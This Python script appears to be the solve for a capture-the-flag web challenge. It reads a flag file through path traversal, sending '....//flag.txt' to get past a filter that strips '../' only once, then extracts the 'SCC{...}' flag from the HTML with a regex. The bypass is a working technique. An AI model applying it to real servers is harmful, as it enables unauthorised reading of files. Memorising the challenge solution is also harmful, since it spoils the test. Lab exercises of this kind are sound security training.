import os
import re

import requests

SITE_URL = os.environ["SERVICE_APP_MAIN_ENDPOINT"]


def main():
    # server.py only strips "../" once (non-recursively), so "....//" collapses
    # into "../" after a single pass, giving a working path traversal out of
    # the cities/ directory and into flag.txt next to server.py.
    resp = requests.get(f"{SITE_URL}/city", params={"file": "....//flag.txt"})
    resp.raise_for_status()

    # The flag file's content is rendered inline inside city.html, so pull it
    # out of the HTML body with a regex rather than assuming a bare response.
    match = re.search(r"SCC\{[^}]*\}", resp.text)
    if not match:
        raise RuntimeError(f"Flag not found in response: {resp.text}")

    flag = match.group(0)
    print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
